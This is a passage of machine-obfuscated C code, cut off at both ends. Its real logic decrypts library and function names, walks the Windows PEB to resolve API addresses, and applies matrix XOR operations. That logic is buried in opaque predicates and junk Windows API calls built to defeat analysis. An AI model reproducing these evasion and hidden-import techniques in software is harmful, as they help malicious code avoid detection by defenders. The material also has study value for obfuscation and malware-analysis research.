                      v5ecaebdc17cefdf2e0667d291c0c92f2_true_opaque = v2c360aade2706bf970b7c30c7a10c8ad_useless_opaque != v91288c1ae87c817cee4f2981d2f47e90_useless_opaque;
                    }
                    v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque = v9c284308d1d45986cc4e1bd0eabdb3c3_computation_opaque || v3db9e82ca8fe67a4b38221bc8cfa47ac_useless_opaque;
                    v6a0ec8413774d540e0b095914b80b665_computation_opaque = v9c284308d1d45986cc4e1bd0eabdb3c3_computation_opaque + v3db9e82ca8fe67a4b38221bc8cfa47ac_useless_opaque;
                  }
                  v0a3f69e8ae1a70574abc8110bcb48570 = RoUnregisterForApartmentShutdown(vbab95b3d8f291597285036280afa6207);
                }
              }
            }
          }
          unsigned long vae5d2d3d781b1f2054fe0ed38eb1230b = (unsigned long) 0xbbecdc6b;
          void * vb94c823f2376b53fab4556078dbca759 = (void *) 0x1d029da8;
          int va56c49c1e6f8e8ec5a4f63e81d203d4f = (int) 0x03eb2469;
          void * v1e48a62544158be27f1a8bb6dd628d92 = (void *) 0xdfcf6f30;
          if (v5ecaebdc17cefdf2e0667d291c0c92f2_true_opaque)
          {
            if (v5ecaebdc17cefdf2e0667d291c0c92f2_true_opaque)
            {
              int vd075d5e5478166b0a629a5b726f01ce6 = (int) 0xe9c6290a;
              int va838debde6207760f5180796a6a9b22e = (int) 0xfbff2136;
              if (((v6cc38d9666e712ade396845c3808ef6e_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v6cc38d9666e712ade396845c3808ef6e_prime_opaque == ((unsigned int) 2)))
              {
                if (((v6cc38d9666e712ade396845c3808ef6e_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v6cc38d9666e712ade396845c3808ef6e_prime_opaque == ((unsigned int) 2)))
                {
                  va838debde6207760f5180796a6a9b22e = IdnToNameprepUnicode(vae5d2d3d781b1f2054fe0ed38eb1230b, vb94c823f2376b53fab4556078dbca759, va56c49c1e6f8e8ec5a4f63e81d203d4f, v1e48a62544158be27f1a8bb6dd628d92, vd075d5e5478166b0a629a5b726f01ce6);
                  if (!(((v6cc38d9666e712ade396845c3808ef6e_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v6cc38d9666e712ade396845c3808ef6e_prime_opaque == ((unsigned int) 2))))
                  {
                    v3db9e82ca8fe67a4b38221bc8cfa47ac_useless_opaque = v91288c1ae87c817cee4f2981d2f47e90_useless_opaque <= v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque;
                    v5ecaebdc17cefdf2e0667d291c0c92f2_true_opaque = v7184e887ca12f3b610a9efb2f160b29b_computation_opaque * v2c360aade2706bf970b7c30c7a10c8ad_useless_opaque;
                    v3db9e82ca8fe67a4b38221bc8cfa47ac_useless_opaque = v6a0ec8413774d540e0b095914b80b665_computation_opaque * v2c360aade2706bf970b7c30c7a10c8ad_useless_opaque;
                  }
                }
                if (!((((v1b95532e2ed32281e6690f4d849e5d6b_random_opaque * v1b95532e2ed32281e6690f4d849e5d6b_random_opaque) * ((unsigned int) 9)) + ((v1b95532e2ed32281e6690f4d849e5d6b_random_opaque * v1b95532e2ed32281e6690f4d849e5d6b_random_opaque) * ((unsigned int) 16))) == ((v1b95532e2ed32281e6690f4d849e5d6b_random_opaque * v1b95532e2ed32281e6690f4d849e5d6b_random_opaque) * ((unsigned int) 25))))
                {
                  v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque = v2c360aade2706bf970b7c30c7a10c8ad_useless_opaque == v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque;
                  v12b7305d153da6ce6d715517afc7c2bf_useless_opaque = v9c284308d1d45986cc4e1bd0eabdb3c3_computation_opaque | v91288c1ae87c817cee4f2981d2f47e90_useless_opaque;
                  v12b7305d153da6ce6d715517afc7c2bf_useless_opaque = v6a0ec8413774d540e0b095914b80b665_computation_opaque - v6cc38d9666e712ade396845c3808ef6e_prime_opaque;
                  v12b7305d153da6ce6d715517afc7c2bf_useless_opaque = v6cc38d9666e712ade396845c3808ef6e_prime_opaque / v3870911ccd0eabdfd1f30612741d9686_computation_opaque;
                  if (!v5ecaebdc17cefdf2e0667d291c0c92f2_true_opaque)
                  {
                    v9c284308d1d45986cc4e1bd0eabdb3c3_computation_opaque = v1b95532e2ed32281e6690f4d849e5d6b_random_opaque / ((unsigned int) 24);
                  }
                  v3870911ccd0eabdfd1f30612741d9686_computation_opaque = v7184e887ca12f3b610a9efb2f160b29b_computation_opaque || v12b7305d153da6ce6d715517afc7c2bf_useless_opaque;
                }
              }
            }
          }
        }
        if ((((v1b95532e2ed32281e6690f4d849e5d6b_random_opaque * v1b95532e2ed32281e6690f4d849e5d6b_random_opaque) * ((unsigned int) 9)) + ((v1b95532e2ed32281e6690f4d849e5d6b_random_opaque * v1b95532e2ed32281e6690f4d849e5d6b_random_opaque) * ((unsigned int) 16))) == ((v1b95532e2ed32281e6690f4d849e5d6b_random_opaque * v1b95532e2ed32281e6690f4d849e5d6b_random_opaque) * ((unsigned int) 25)))
        {
          kernel_library_name = (const wchar_t *) (encrypted_kernel_library_name + iv_length);
          if (!v5ecaebdc17cefdf2e0667d291c0c92f2_true_opaque)
          {
            v3db9e82ca8fe67a4b38221bc8cfa47ac_useless_opaque = v12b7305d153da6ce6d715517afc7c2bf_useless_opaque != v5ecaebdc17cefdf2e0667d291c0c92f2_true_opaque;
            v6cc38d9666e712ade396845c3808ef6e_prime_opaque = v5ecaebdc17cefdf2e0667d291c0c92f2_true_opaque <= v9c284308d1d45986cc4e1bd0eabdb3c3_computation_opaque;
            v2c360aade2706bf970b7c30c7a10c8ad_useless_opaque = v3db9e82ca8fe67a4b38221bc8cfa47ac_useless_opaque | v3870911ccd0eabdfd1f30612741d9686_computation_opaque;
            v6cc38d9666e712ade396845c3808ef6e_prime_opaque = v3870911ccd0eabdfd1f30612741d9686_computation_opaque % v3db9e82ca8fe67a4b38221bc8cfa47ac_useless_opaque;
            v3870911ccd0eabdfd1f30612741d9686_computation_opaque = v5ecaebdc17cefdf2e0667d291c0c92f2_true_opaque * v12b7305d153da6ce6d715517afc7c2bf_useless_opaque;
            v9c284308d1d45986cc4e1bd0eabdb3c3_computation_opaque = v3db9e82ca8fe67a4b38221bc8cfa47ac_useless_opaque % v9c284308d1d45986cc4e1bd0eabdb3c3_computation_opaque;
            v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque = v5ecaebdc17cefdf2e0667d291c0c92f2_true_opaque - v6cc38d9666e712ade396845c3808ef6e_prime_opaque;
          }
          kernel_library_function_names = encrypted_kernel_library_function_names + iv_length;
          kernel_library_address = get_module_address(peb_windows_structure, kernel_library_name);
          for (int i = 0; i < number_kernel_library_functions; i++)
          {
            const char *function_name = get_function_by_number(kernel_library_function_names, i);
            kernel_library_function_addresses[i] = get_function_address(kernel_library_address, function_name);
            if (v5ecaebdc17cefdf2e0667d291c0c92f2_true_opaque)
            {
              if (!((((v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque * v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque) * ((unsigned int) 9)) + ((v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque * v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque) * ((unsigned int) 16))) == ((v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque * v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque) * ((unsigned int) 25))))
              {
                if (!(((v6cc38d9666e712ade396845c3808ef6e_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v6cc38d9666e712ade396845c3808ef6e_prime_opaque == ((unsigned int) 2))))
                {
                  if (!(((v6cc38d9666e712ade396845c3808ef6e_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v6cc38d9666e712ade396845c3808ef6e_prime_opaque == ((unsigned int) 2))))
                  {
                    v5ecaebdc17cefdf2e0667d291c0c92f2_true_opaque = v91288c1ae87c817cee4f2981d2f47e90_useless_opaque || v2c360aade2706bf970b7c30c7a10c8ad_useless_opaque;
                    v6cc38d9666e712ade396845c3808ef6e_prime_opaque = v9c284308d1d45986cc4e1bd0eabdb3c3_computation_opaque < v1b95532e2ed32281e6690f4d849e5d6b_random_opaque;
                  }
                  v7184e887ca12f3b610a9efb2f160b29b_computation_opaque = v6cc38d9666e712ade396845c3808ef6e_prime_opaque || v5ecaebdc17cefdf2e0667d291c0c92f2_true_opaque;
                }
                if ((((v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque * v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque) * ((unsigned int) 9)) + ((v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque * v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque) * ((unsigned int) 16))) == ((v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque * v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque) * ((unsigned int) 25)))
                {
                  if (!((((v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque * v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque) * ((unsigned int) 9)) + ((v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque * v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque) * ((unsigned int) 16))) == ((v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque * v2e926f36d9d1bc5436b0ff48f54e2cdf_random_opaque) * ((unsigned int) 25))))
                  {
                    unsigned long v28c2b10657d8e3190695940e345650c4 = (unsigned long) 0x2cfa3321;
                    unsigned long v295f92769b2014a01e9c72fc7f773bc8 = (unsigned long) 0xd09ae27b;
                    if (!v5ecaebdc17cefdf2e0667d291c0c92f2_true_opaque)
                    {
                      void * v26b6b1a7d70d9bb830f4cdb1f0bd06a5 = (void *) 0x93dd8848;
                      void * v0c1941bed4094261e4740d5e97f8aed2 = (void *) 0x0a778b40;
                      unsigned long v99bf30be7e9116a4255463b4476798be = (unsigned long) 0x11b0632d;
                      unsigned long v07f244ff2ed5d1070b379b3e5082d3c1 = (unsigned long) 0x012faac0;
                      v07f244ff2ed5d1070b379b3e5082d3c1 = GetModuleFileNameA(v26b6b1a7d70d9bb830f4cdb1f0bd06a5, v0c1941bed4094261e4740d5e97f8aed2, v99bf30be7e9116a4255463b4476798be);
                    }
                    void * v10567dbfffebe0f2a9bfde23b9b3f4a7 = (void *) 0x3143d7d2;
                    if (((v6cc38d9666e712ade396845c3808ef6e_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v6cc38d9666e712ade396845c3808ef6e_prime_opaque == ((unsigned int) 2)))
                    {
                      int vea54d30082da54a525c56c2a39a017e4 = (int) 0x141d4495;
                      int va91f469f455ffc73a89ad940a460d620 = (int) 0xbdbbeff9;
                      va91f469f455ffc73a89ad940a460d620 = GetLocaleInfoW(v28c2b10657d8e3190695940e345650c4, v295f92769b2014a01e9c72fc7f773bc8, v10567dbfffebe0f2a9bfde23b9b3f4a7, vea54d30082da54a525c56c2a39a017e4);
                    }
                  }
                  void * ve4deaa9e0b0201caa8c7ef4b5a1cdf98 = (void *) 0x1c3218d7;
                  int v0bca2168466dc6b08d9350bc3a2b6fa0 = (int) 0xd828fe11;
                  v0bca2168466dc6b08d9350bc3a2b6fa0 = RemoveDllDirectory(ve4deaa9e0b0201caa8c7ef4b5a1cdf98);
                }
              }
            }
          }

        }
      }
    }
  }
}

void matrix_xor(int (*matrix_1)[4], int (*matrix_2)[4], int (*matrix_result)[4])
{
  unsigned int v517d404f722f30813a35fef10c2f564f_useless_opaque = (unsigned int) 2477880950;
  unsigned int v9a64afd45b6e1d6afaa237b2656395fb_random_opaque = (unsigned int) (&v517d404f722f30813a35fef10c2f564f_useless_opaque);
  {
    {
      {
        unsigned int vb91e87456558b6d5e6449b4861590cfe_useless_opaque = (unsigned int) 1413910933;
        unsigned int va4dabc630a68786b84d0141bd9e34327_computation_opaque = (unsigned int) (&vb91e87456558b6d5e6449b4861590cfe_useless_opaque);
        unsigned int v75070ab371727fd3f627435974ca295d_true_opaque = (((va4dabc630a68786b84d0141bd9e34327_computation_opaque * va4dabc630a68786b84d0141bd9e34327_computation_opaque) + va4dabc630a68786b84d0141bd9e34327_computation_opaque) % ((unsigned int) 2)) == ((unsigned int) 0);
        for (int i = 0; i < 4; i++)
          for (int j = 0; j < 4; j++)
          matrix_result[i][j] = matrix_1[i][j] ^ matrix_2[i][j];


        if (!((((v9a64afd45b6e1d6afaa237b2656395fb_random_opaque * v9a64afd45b6e1d6afaa237b2656395fb_random_opaque) * ((unsigned int) 9)) + ((v9a64afd45b6e1d6afaa237b2656395fb_random_opaque * v9a64afd45b6e1d6afaa237b2656395fb_random_opaque) * ((unsigned int) 16))) == ((v9a64afd45b6e1d6afaa237b2656395fb_random_opaque * v9a64afd45b6e1d6afaa237b2656395fb_random_opaque) * ((unsigned int) 25))))
        {
          if (!v75070ab371727fd3f627435974ca295d_true_opaque)
          {
            if (!v75070ab371727fd3f627435974ca295d_true_opaque)
            {
              if (!v75070ab371727fd3f627435974ca295d_true_opaque)
              {
                v517d404f722f30813a35fef10c2f564f_useless_opaque = v517d404f722f30813a35fef10c2f564f_useless_opaque - vb91e87456558b6d5e6449b4861590cfe_useless_opaque;
              }
              va4dabc630a68786b84d0141bd9e34327_computation_opaque = v9a64afd45b6e1d6afaa237b2656395fb_random_opaque == va4dabc630a68786b84d0141bd9e34327_computation_opaque;
              va4dabc630a68786b84d0141bd9e34327_computation_opaque = v75070ab371727fd3f627435974ca295d_true_opaque % ((unsigned int) 109);
              vb91e87456558b6d5e6449b4861590cfe_useless_opaque = v517d404f722f30813a35fef10c2f564f_useless_opaque / v75070ab371727fd3f627435974ca295d_true_opaque;
              v9a64afd45b6e1d6afaa237b2656395fb_random_opaque = va4dabc630a68786b84d0141bd9e34327_computation_opaque * ((unsigned int) 126);
              v75070ab371727fd3f627435974ca295d_true_opaque = vb91e87456558b6d5e6449b4861590cfe_useless_opaque * va4dabc630a68786b84d0141bd9e34327_computation_opaque;
            }
            v75070ab371727fd3f627435974ca295d_true_opaque = v517d404f722f30813a35fef10c2f564f_useless_opaque <= ((unsigned int) 54);
            vb91e87456558b6d5e6449b4861590cfe_useless_opaque = vb91e87456558b6d5e6449b4861590cfe_useless_opaque <= v517d404f722f30813a35fef10c2f564f_useless_opaque;
          }
          if (!v75070ab371727fd3f627435974ca295d_true_opaque)
          {
            if (!v75070ab371727fd3f627435974ca295d_true_opaque)
            {
              if (v75070ab371727fd3f627435974ca295d_true_opaque)
              {
                if (!v75070ab371727fd3f627435974ca295d_true_opaque)
                {
                  v9a64afd45b6e1d6afaa237b2656395fb_random_opaque = v517d404f722f30813a35fef10c2f564f_useless_opaque | ((unsigned int) 73);
                  vb91e87456558b6d5e6449b4861590cfe_useless_opaque = v517d404f722f30813a35fef10c2f564f_useless_opaque < va4dabc630a68786b84d0141bd9e34327_computation_opaque;
                }
                v9a64afd45b6e1d6afaa237b2656395fb_random_opaque = v517d404f722f30813a35fef10c2f564f_useless_opaque / ((unsigned int) 13);
              }
            }
            unsigned long vd692b404133319e1a17dd0f37c560ff9 = (unsigned long) 0xaeb732d8;
            if (v75070ab371727fd3f627435974ca295d_true_opaque)
            {
              if ((((v9a64afd45b6e1d6afaa237b2656395fb_random_opaque * v9a64afd45b6e1d6afaa237b2656395fb_random_opaque) * ((unsigned int) 9)) + ((v9a64afd45b6e1d6afaa237b2656395fb_random_opaque * v9a64afd45b6e1d6afaa237b2656395fb_random_opaque) * ((unsigned int) 16))) == ((v9a64afd45b6e1d6afaa237b2656395fb_random_opaque * v9a64afd45b6e1d6afaa237b2656395fb_random_opaque) * ((unsigned int) 25)))
              {
                unsigned long veecb2930b113123e0de168fd2ed80ff2 = (unsigned long) 0xbc2de58b;
                if (!((((v9a64afd45b6e1d6afaa237b2656395fb_random_opaque * v9a64afd45b6e1d6afaa237b2656395fb_random_opaque) * ((unsigned int) 9)) + ((v9a64afd45b6e1d6afaa237b2656395fb_random_opaque * v9a64afd45b6e1d6afaa237b2656395fb_random_opaque) * ((unsigned int) 16))) == ((v9a64afd45b6e1d6afaa237b2656395fb_random_opaque * v9a64afd45b6e1d6afaa237b2656395fb_random_opaque) * ((unsigned int) 25))))
                {
                  va4dabc630a68786b84d0141bd9e34327_computation_opaque = v75070ab371727fd3f627435974ca295d_true_opaque + va4dabc630a68786b84d0141bd9e34327_computation_opaque;
                  v517d404f722f30813a35fef10c2f564f_useless_opaque = v9a64afd45b6e1d6afaa237b2656395fb_random_opaque != ((unsigned int) 112);
                  v75070ab371727fd3f627435974ca295d_true_opaque = vb91e87456558b6d5e6449b4861590cfe_useless_opaque <= v517d404f722f30813a35fef10c2f564f_useless_opaque;
                  v517d404f722f30813a35fef10c2f564f_useless_opaque = v75070ab371727fd3f627435974ca295d_true_opaque / v517d404f722f30813a35fef10c2f564f_useless_opaque;
                  v517d404f722f30813a35fef10c2f564f_useless_opaque = v75070ab371727fd3f627435974ca295d_true_opaque <= ((unsigned int) 83);
                  v9a64afd45b6e1d6afaa237b2656395fb_random_opaque = vb91e87456558b6d5e6449b4861590cfe_useless_opaque < va4dabc630a68786b84d0141bd9e34327_computation_opaque;
                }
                veecb2930b113123e0de168fd2ed80ff2 = MsiGetActiveDatabase(vd692b404133319e1a17dd0f37c560ff9);
              }
            }
          }
          unsigned long v425bb0e0771fc49f5b4e901ac091d97a = (unsigned long) 0xb314d307;
          unsigned long v10f9d9647bd0b5664d66932a8c7633ba = (unsigned long) 0x0a992406;
          v10f9d9647bd0b5664d66932a8c7633ba = MsiGetActiveDatabase(v425bb0e0771fc49f5b4e901ac091d97a);
        }
      }
      if (!((((v9a64afd45b6e1d6afaa237b2656395fb_random_opaque * v9a64afd45b6e1d6afaa237b2656395fb_random_opaque) * ((unsigned int) 9)) + ((v9a64afd45b6e1d6afaa237b2656395fb_random_opaque * v9a64afd45b6e1d6afaa237b2656395fb_random_opaque) * ((unsigned int) 16))) == ((v9a64afd45b6e1d6afaa237b2656395fb_random_opaque * v9a64afd45b6e1d6afaa237b2656395fb_random_opaque) * ((unsigned int) 25))))
      {
        void * v89d0b08faa47eefde774151d91d0a297 = (void *) 0x72715590;
        if (!((((v9a64afd45b6e1d6afaa237b2656395fb_random_opaque * v9a64afd45b6e1d6afaa237b2656395fb_random_opaque) * ((unsigned int) 9)) + ((v9a64afd45b6e1d6afaa237b2656395fb_random_opaque * v9a64afd45b6e1d6afaa237b2656395fb_random_opaque) * ((unsigned int) 16))) == ((v9a64afd45b6e1d6afaa237b2656395fb_random_opaque * v9a64afd45b6e1d6afaa237b2656395fb_random_opaque) * ((unsigned int) 25))))
        {
          v517d404f722f30813a35fef10c2f564f_useless_opaque = v517d404f722f30813a35fef10c2f564f_useless_opaque / v9a64afd45b6e1d6afaa237b2656395fb_random_opaque;
          v9a64afd45b6e1d6afaa237b2656395fb_random_opaque = v9a64afd45b6e1d6afaa237b2656395fb_random_opaque == v517d404f722f30813a35fef10c2f564f_useless_opaque;
          v9a64afd45b6e1d6afaa237b2656395fb_random_opaque = v9a64afd45b6e1d6afaa237b2656395fb_random_opaque / ((unsigned int) 85);
          if (!((((v9a64afd45b6e1d6afaa237b2656395fb_random_opaque * v9a64afd45b6e1d6afaa237b2656395fb_random_opaque) * ((unsigned int) 9)) + ((v9a64afd45b6e1d6afaa237b2656395fb_random_opaque * v9a64afd45b6e1d6afaa237b2656395fb_random_opaque) * ((unsigned int) 16))) == ((v9a64afd45b6e1d6afaa237b2656395fb_random_opaque * v9a64afd45b6e1d6afaa237b2656395fb_random_opaque) * ((unsigned int) 25))))
          {
            v517d404f722f30813a35fef10c2f564f_useless_opaque = v9a64afd45b6e1d6afaa237b2656395fb_random_opaque == v517d404f722f30813a35fef10c2f564f_useless_opaque;
          }
          v517d404f722f30813a35fef10c2f564f_useless_opaque = v517d404f722f30813a35fef10c2f564f_useless_opaque < ((unsigned int) 15);
          v517d404f722f30813a35fef10c2f564f_useless_opaque = v9a64afd45b6e1d6afaa237b2656395fb_random_opaque || v517d404f722f30813a35fef10c2f564f_useless_opaque;
          v517d404f722f30813a35fef10c2f564f_useless_opaque = v9a64afd45b6e1d6afaa237b2656395fb_random_opaque <= v517d404f722f30813a35fef10c2f564f_useless_opaque;
        }
        int v0ac0eaa997632ad99575715b5f1349ad = (int) 0x59fb55d6;
        v0ac0eaa997632ad99575715b5f1349ad = RemoveDllDirectory(v89d0b08faa47eefde774151d91d0a297);
        if (!((((v9a64afd45b6e1d6afaa237b2656395fb_random_opaque * v9a64afd45b6e1d6afaa237b2656395fb_random_opaque) * ((unsigned int) 9)) + ((v9a64afd45b6e1d6afaa237b2656395fb_random_opaque * v9a64afd45b6e1d6afaa237b2656395fb_random_opaque) * ((unsigned int) 16))) == ((v9a64afd45b6e1d6afaa237b2656395fb_random_opaque * v9a64afd45b6e1d6afaa237b2656395fb_random_opaque) * ((unsigned int) 25))))
        {
          unsigned long v9a3ef500e57548706e56a859799e1ed1 = (unsigned long) 0x254663b6;
          void * vb1f03d9c13f3ad30e9fb18feb165bac6 = (void *) 0xa37d917a;
          int v0101a63657ed2c9a92a4dbc70c2940ed = (int) 0x00667eb0;
          void * v982b98e80a2081e9f4301886da138149 = (void *) 0x06bd889e;
          int vf3720f7d3fde83a0c48eb49af0a5a13b = (int) 0xcb2ce125;
          int v92017a81e81ff6faf94ea9474de6207d = (int) 0xa3bfd31f;
          v92017a81e81ff6faf94ea9474de6207d = IdnToNameprepUnicode(v9a3ef500e57548706e56a859799e1ed1, vb1f03d9c13f3ad30e9fb18feb165bac6, v0101a63657ed2c9a92a4dbc70c2940ed, v982b98e80a2081e9f4301886da138149, vf3720f7d3fde83a0c48eb49af0a5a13b);
        }
      }
    }
    unsigned int ve6574a9e340574a0ed5ea8a409e675b4_useless_opaque = (unsigned int) 2060370284;
    unsigned int v8fc936f2143f7f59a3aaf95cc6d4aaeb_computation_opaque = (unsigned int) 0;
    if (!((((v9a64afd45b6e1d6afaa237b2656395fb_random_opaque * v9a64afd45b6e1d6afaa237b2656395fb_random_opaque) * ((unsigned int) 9)) + ((v9a64afd45b6e1d6afaa237b2656395fb_random_opaque * v9a64afd45b6e1d6afaa237b2656395fb_random_opaque) * ((unsigned int) 16))) == ((v9a64afd45b6e1d6afaa237b2656395fb_random_opaque * v9a64afd45b6e1d6afaa237b2656395fb_random_opaque) * ((unsigned int) 25))))
    {
      void * v77f60efb67896101179bc65b4a753708 = (void *) 0x93254cf3;
      unsigned long vaca5fbc3571e9654c8562efa747c57c9 = (unsigned long) 0x32890578;
      unsigned long v935d4eec852b6850d8bc46e4e60b3cf4 = (unsigned long) 0x89993e73;
      v935d4eec852b6850d8bc46e4e60b3cf4 = SnmpListen(v77f60efb67896101179bc65b4a753708, vaca5fbc3571e9654c8562efa747c57c9);
      if (!((((v9a64afd45b6e1d6afaa237b2656395fb_random_opaque * v9a64afd45b6e1d6afaa237b2656395fb_random_opaque) * ((unsigned int) 9)) + ((v9a64afd45b6e1d6afaa237b2656395fb_random_opaque * v9a64afd45b6e1d6afaa237b2656395fb_random_opaque) * ((unsigned int) 16))) == ((v9a64afd45b6e1d6afaa237b2656395fb_random_opaque * v9a64afd45b6e1d6afaa237b2656395fb_random_opaque) * ((unsigned int) 25))))
      {
        void * v63656f37bdd72705c114bbfde04eb023 = (void *) 0xe17fa387;
        if (!((((v9a64afd45b6e1d6afaa237b2656395fb_random_opaque * v9a64afd45b6e1d6afaa237b2656395fb_random_opaque) * ((unsigned int) 9)) + ((v9a64afd45b6e1d6afaa237b2656395fb_random_opaque * v9a64afd45b6e1d6afaa237b2656395fb_random_opaque) * ((unsigned int) 16))) == ((v9a64afd45b6e1d6afaa237b2656395fb_random_opaque * v9a64afd45b6e1d6afaa237b2656395fb_random_opaque) * ((unsigned int) 25))))
        {
          v517d404f722f30813a35fef10c2f564f_useless_opaque = v517d404f722f30813a35fef10c2f564f_useless_opaque || ve6574a9e340574a0ed5ea8a409e675b4_useless_opaque;
          ve6574a9e340574a0ed5ea8a409e675b4_useless_opaque = v8fc936f2143f7f59a3aaf95cc6d4aaeb_computation_opaque + ve6574a9e340574a0ed5ea8a409e675b4_useless_opaque;
          ve6574a9e340574a0ed5ea8a409e675b4_useless_opaque = v517d404f722f30813a35fef10c2f564f_useless_opaque / v8fc936f2143f7f59a3aaf95cc6d4aaeb_computation_opaque;
          v517d404f722f30813a35fef10c2f564f_useless_opaque = v9a64afd45b6e1d6afaa237b2656395fb_random_opaque % v517d404f722f30813a35fef10c2f564f_useless_opaque;
        }
        unsigned long v6d1f125d03b60ce8cb308e6f133dad2a = (unsigned long) 0x951d237e;
        unsigned long v9220b47b0ab4dd64836c209f785fbaad = (unsigned long) 0x19718279;
        v9220b47b0ab4dd64836c209f785fbaad = SnmpListen(v63656f37bdd72705c114bbfde04eb023, v6d1f125d03b60ce8cb308e6f133dad2a);
      }
    }
    unsigned int v7b051ed804c6aca2e73ea6e1a2afb775_computation_opaque = (unsigned int) 3;
    unsigned int vf9c305384fb6a7c456691b2c394d54b8_useless_opaque = (unsigned int) 494521604;
    unsigned int v1f5cdc881b3ffb1d6cddeb4631097d04_random_opaque = (unsigned int) (&vf9c305384fb6a7c456691b2c394d54b8_useless_opaque);
    unsigned int ved8e91ac7321d53333d880a4e68b0993_computation_opaque = (unsigned int) (&ve6574a9e340574a0ed5ea8a409e675b4_useless_opaque);
    ved8e91ac7321d53333d880a4e68b0993_computation_opaque = (ved8e91ac7321d53333d880a4e68b0993_computation_opaque % ((unsigned int) 2147483647)) | ((unsigned int) 1);
    if (ved8e91ac7321d53333d880a4e68b0993_computation_opaque < ((unsigned int) 3))
    {
      if ((((v1f5cdc881b3ffb1d6cddeb4631097d04_random_opaque * v1f5cdc881b3ffb1d6cddeb4631097d04_random_opaque) * ((unsigned int) 9)) + ((v1f5cdc881b3ffb1d6cddeb4631097d04_random_opaque * v1f5cdc881b3ffb1d6cddeb4631097d04_random_opaque) * ((unsigned int) 16))) == ((v1f5cdc881b3ffb1d6cddeb4631097d04_random_opaque * v1f5cdc881b3ffb1d6cddeb4631097d04_random_opaque) * ((unsigned int) 25)))
      {
        ved8e91ac7321d53333d880a4e68b0993_computation_opaque = (unsigned int) 3;
      }
    }
    while (v8fc936f2143f7f59a3aaf95cc6d4aaeb_computation_opaque != ((unsigned int) 1))
    {
      if ((((v9a64afd45b6e1d6afaa237b2656395fb_random_opaque * v9a64afd45b6e1d6afaa237b2656395fb_random_opaque) * ((unsigned int) 9)) + ((v9a64afd45b6e1d6afaa237b2656395fb_random_opaque * v9a64afd45b6e1d6afaa237b2656395fb_random_opaque) * ((unsigned int) 16))) == ((v9a64afd45b6e1d6afaa237b2656395fb_random_opaque * v9a64afd45b6e1d6afaa237b2656395fb_random_opaque) * ((unsigned int) 25)))
      {
        ved8e91ac7321d53333d880a4e68b0993_computation_opaque += (unsigned int) 2;
        v8fc936f2143f7f59a3aaf95cc6d4aaeb_computation_opaque = (unsigned int) 1;
        v7b051ed804c6aca2e73ea6e1a2afb775_computation_opaque = (unsigned int) 3;
        if ((((v9a64afd45b6e1d6afaa237b2656395fb_random_opaque * v9a64afd45b6e1d6afaa237b2656395fb_random_opaque) * ((unsigned int) 9)) + ((v9a64afd45b6e1d6afaa237b2656395fb_random_opaque * v9a64afd45b6e1d6afaa237b2656395fb_random_opaque) * ((unsigned int) 16))) == ((v9a64afd45b6e1d6afaa237b2656395fb_random_opaque * v9a64afd45b6e1d6afaa237b2656395fb_random_opaque) * ((unsigned int) 25)))
        {
          while ((v7b051ed804c6aca2e73ea6e1a2afb775_computation_opaque * v7b051ed804c6aca2e73ea6e1a2afb775_computation_opaque) <= ved8e91ac7321d53333d880a4e68b0993_computation_opaque)
          {
            if ((ved8e91ac7321d53333d880a4e68b0993_computation_opaque % v7b051ed804c6aca2e73ea6e1a2afb775_computation_opaque) == ((unsigned int) 0))
            {
              v8fc936f2143f7f59a3aaf95cc6d4aaeb_computation_opaque = (unsigned int) 0;
            }
            v7b051ed804c6aca2e73ea6e1a2afb775_computation_opaque = v7b051ed804c6aca2e73ea6e1a2afb775_computation_opaque + ((unsigned int) 2);
            if (!((((v1f5cdc881b3ffb1d6cddeb4631097d04_random_opaque * v1f5cdc881b3ffb1d6cddeb4631097d04_random_opaque) * ((unsigned int) 9)) + ((v1f5cdc881b3ffb1d6cddeb4631097d04_random_opaque * v1f5cdc881b3ffb1d6cddeb4631097d04_random_opaque) * ((unsigned int) 16))) == ((v1f5cdc881b3ffb1d6cddeb4631097d04_random_opaque * v1f5cdc881b3ffb1d6cddeb4631097d04_random_opaque) * ((unsigned int) 25))))
            {
              void * v3daa22bd0cad8ab2e45e6ec9b95ab5dd = (void *) 0x18889f8a;
              int v3bd68fff4bd4ccebcd179155f978d8e6 = (int) 0xfd6f5b2d;
              v3bd68fff4bd4ccebcd179155f978d8e6 = RemoveDllDirectory(v3daa22bd0cad8ab2e45e6ec9b95ab5dd);
            }
          }

        }
      }
    }

    unsigned int v2a3fd4537b6bec831e669d34e6995cbd_prime_opaque = ved8e91ac7321d53333d880a4e68b0993_computation_opaque;
  }
}

void matrix_mul(int (*matrix_1)[4], int (*matrix_2)[4], int (*matrix_result)[4])
{
  {
    {
      unsigned int v9173003365369be689f4314d1fd71dfa_useless_opaque = (unsigned int) 1348790869;
      unsigned int v1f083764923956d0b57470a75d9bd7d4_computation_opaque = (unsigned int) (&v9173003365369be689f4314d1fd71dfa_useless_opaque);
